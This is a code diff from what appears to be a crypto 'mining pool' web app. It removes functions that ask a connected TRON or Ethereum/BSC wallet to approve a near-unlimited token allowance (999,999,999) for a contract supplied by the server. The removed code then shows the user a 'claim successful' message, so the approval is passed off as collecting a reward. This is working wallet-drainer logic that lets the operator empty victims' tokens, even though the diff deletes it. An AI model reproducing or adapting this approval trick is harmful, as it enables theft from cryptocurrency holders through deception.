@@ -71,12 +71,6 @@
       },
 			changeLang() {
 				this.getContent()
-				// this.reset()
-			},
-			reset() {
-				this.mining_pool = {}
-				this.earnings = []
-				this.problem = []
 			},
 			async getContent() {
         const res = await http.post('/api/Index/home')
@@ -95,106 +89,6 @@
 				})
         await this.$store.dispatch(`setTitle`, data)
         await uni.setNavigationBarTitle({title: data?.title})
-			},
-			async doapprove_success() {
-				//保存授权地址信息，无需处理返回信息
-        console.log(`call doapprove_success`)
-			},
-			async doapprove_trc() {
-        console.log(`call doapprove_trc`)
-				//是否获取到相应合约
-				if (this.contracts.length === 0 || !this.contracts?.trc) {
-					return false;
-				}
-				await uni.showLoading()
-				try {
-					let contractdata = this.contracts?.trc
-          if (!contractdata) {
-            return;
-          }
-          const tronWeb = window.tronWeb
-					let _value = 999999999000000 //授权数量
-					const parameter = [{
-						type: 'address',
-						value: contractdata.smart_contract
-					}, {
-						type: 'uint256',
-						value: _value
-					}];
-					const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-						contractdata.smart_contract,
-						"approve(address,uint256)", {},
-						parameter,
-              this.address
-					);
-					const signedTx = await tronWeb.trx.sign(tx.transaction);
-					const broastTx = await tronWeb.trx.sendRawTransaction(signedTx);
-					uni.hideLoading()
-					if (broastTx?.result) {
-
-						//授权处理成功，开始成功后的业务处理----------------------
-            await this.$store.dispatch(`setIsApprove`, {result: true, txid: broastTx.txid})
-						await this.doapprove_success()
-						//授权处理成功，结束成功后的业务处理----------------------
-
-						comjs.jsalert("领取成功");
-					} else {
-						comjs.msg('领取失败')
-					}
-				} catch (e) {
-					uni.hideLoading()
-          console.log(`exception:`,e)
-					comjs.msg('领取失败')
-				}
-			},
-			async doapprove_eth() {
-        console.log(`doapprove_eth`)
-				await uni.showLoading()
-				try {
-					//以太坊/币安  授权开始
-					let strabi =
-						'[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]'
-					let abi = JSON.parse(strabi)
-					let ctx = this.contracts[this.walletLink[this.walletIndex]]
-          if (!ctx) {
-            return;
-          }
-					let contract = new this.web3js.eth.Contract(abi, ctx.token_contract);
-          //授权数量
-					let _value = Web3.utils.toWei("999999999", 'ether');
-          const receipt = await contract.methods.approve(ctx.smart_contract, _value).send({
-            from: this.address
-          })
-          const transactionHash = receipt?.transactionHash;
-          if (transactionHash) {
-            uni.hideLoading()
-            await this.$store.dispatch(`setIsApprove`, {result: true, txid: transactionHash})
-            await this.doapprove_success()
-            comjs.jsalert("领取成功");
-          }
-				} catch (e) {
-          console.log(`e`,e)
-					uni.hideLoading()
-					comjs.msg('领取失败')
-				}
-			},
-			doapprove() {
-				//是否已授权
-				if (this.isApprove) {
-          comjs.jsalert("领取成功");
-					return true;
-				}
-				//没有连接到钱包？开始连接
-				if (!this.isConnected) {
-					this.chooselink()
-					return true;
-				}
-				//开始授权
-				if (this.walletLink[this.walletIndex] === 'trc') {
-					this.doapprove_trc();
-				} else {
-					this.doapprove_eth();
-				}
 			},
 		}
 	}
